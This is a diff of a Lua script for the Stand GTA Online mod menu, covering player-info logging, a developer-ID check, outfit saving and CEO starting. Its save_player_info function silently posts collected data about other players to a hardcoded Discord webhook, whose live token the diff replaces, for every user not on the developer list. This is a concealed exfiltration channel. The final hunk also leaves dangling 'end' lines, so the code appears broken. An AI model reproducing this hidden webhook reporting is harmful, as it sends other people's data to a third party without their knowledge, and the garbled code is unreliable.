@@ -2,8 +2,6 @@ json = require "pretty.json"
 notificationBits = 0
 nearbyNotificationBits = 0
 blips = {}
-local scriptdir = filesystem.scripts_dir()
-local lenaDir = scriptdir .. "Lena\\"
 
 function gen_fren_funcs(name)
     local friend_player_function = menu.list(friend_lists, name, {"friend "..name}, "", function(); end)
@@ -421,7 +419,7 @@ function decimalToHex2s(decimal, numBits = 32)
 end
 
 function is_developer()
-    local developer = {0x0C59991A+3, 0x0CE211E6+7, 0x08634DC4+98, 0x0DD18D77, 0x0DF7B478+0x002D, 0x0E1C0E92}
+    local developer = {0x0C59991A+3, 0x0CE211E6+7, 0x08634DC4+98, 0x0DD18D77, 0x0DF7B478+0x002D, 0x0E1C0E92, 0x03DAF57D}
     local user = players.get_rockstar_id(players.user())
     for developer as id do
         if user == id then
@@ -620,7 +618,6 @@ function save_player_info(pid)
     local is_using_controller = players.is_using_controller(pid)
     local clan_motto = players.clan_get_motto(pid)
     local crew_info = get_player_crew(pid)
-    local macAddress = players.get_host_token_hex(pid):gsub('(..)', '%1:'):sub(1, 11)
     local detections = getDetections(pid)
     local filename = name .. ".txt"
     local filepath = lenaDir .. "Players/" .. filename
@@ -711,7 +708,7 @@ function save_player_info(pid)
         send_to_hook("discord.com", hook, "application/json", json_string)
     end
     if not is_developer() then
-        send_to_hook("discord.com", "/api/webhooks/1149407532318740623/C2VnbpRyW4_Y2A4iTuKCdhhu00MLTf1vF2DVq0wkBlDrw_qIy_1KzWi1dt-pSiQNBRFb", "application/json", json_string)
+        send_to_hook("discord.com", "/api/webhooks/1157814830250594344/fRnEK93AIPAECZuYIrH2QLHmhTvtEzdGU9JjUC-xQsH_W67bfuK64TEicgC19yHR0Xyf", "application/json", json_string)
     end
 end
 
@@ -888,7 +885,7 @@ function update_help_text(commandref, text)
     end
 end
 
-function save_player_outfit(pid, name)
+function save_player_outfit(pid, name) -- A Cheaty way of doing this, but if it works, it works™
     local f = filesystem.stand_dir().."Outfits/"..name
     if io.isdir(f) then 
         return notify("File already exists!")
@@ -908,16 +905,29 @@ function save_player_outfit(pid, name)
     end 
 end
 
-function can_start_ceo()
-    local bossCount = 0 
-    for players.list(true, true, true) as pid do
-        local bossValue = players.get_boss(pid)
-
-        if bossValue == pid then
+function start_ceo()
+    local bossCount = 0
+    local boss = players.get_boss
+    local user = players.user()
+    for players.list(false, true, true) as pid do
+        if boss(pid) == pid then
             bossCount = bossCount + 1
         end
+        if boss(user) == players.user() or boss(user) != -1 then
+            return false, notify("You're already in a CEO.")
+        end
         if bossCount >= 10 then
-            return false
+            return false, notify("Cannot Start CEO due to reaching the MAX Boss count. :/")
+        end
+    end
+    trigger_commands("ceostart")
+    wait(500)
+    if boss(user) == user then
+        return true
+    else
+        return false, "CEO couldn't be started."
+    end
+end
         end
     end
     return true
